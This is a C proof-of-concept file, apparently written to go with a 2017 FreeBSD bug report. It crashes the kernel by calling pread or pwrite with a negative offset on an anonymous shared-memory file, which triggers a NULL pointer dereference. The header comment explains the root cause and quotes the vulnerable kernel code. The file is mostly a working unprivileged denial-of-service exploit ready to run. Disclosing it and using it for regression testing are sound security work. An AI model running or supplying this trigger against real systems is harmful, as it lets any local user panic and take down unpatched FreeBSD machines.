/*
 * shmcrash.c
 *     Crash FreeBSD with pread/pwrite on a shm file.

Reported: 20170228 https://bugs.freebsd.org/bugzilla/show_bug.cgi?id=217429

Description:
Anon shm files create with shm_open have a NULL fp->f_vnode.
But shm_preadv and shm_pwritev will access through this pointer
when the offset is negative:

    error = fget_read(td, fd, cap_rights_init(&rights, CAP_PREAD), &fp);
    if (error)
        return (error);
    if (!(fp->f_ops->fo_flags & DFLAG_SEEKABLE))
        error = ESPIPE;
    else if (offset < 0 && fp->f_vnode->v_type != VCHR)
        error = EINVAL;
    else
        error = dofileread(td, fd, fp, auio, offset, FOF_OFFSET);

This causes a NULL pointer dereference in kernel, and a panic.
No privileges are required.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <unistd.h>

void xperror(char *msg) {
    perror(msg);
    exit(1);
}

int main(int argc, char **argv)
{
    char buf[64];
    int fd, x, w;

    w = (argc == 2 && argv[1][0] == 'w');
    printf("we will %s\n", w ? "write" : "read");

    fd = shm_open(SHM_ANON, O_RDWR, 0);
    if(fd == -1) xperror("shm_open");
    printf("fd %d\n", fd); fflush(stdout);

    if(w)
        x = pwrite(fd, "test", 4, -1);
    else
        x = pread(fd, buf, sizeof buf, -1);
    printf("io %d\n", x);
    return 0;
}

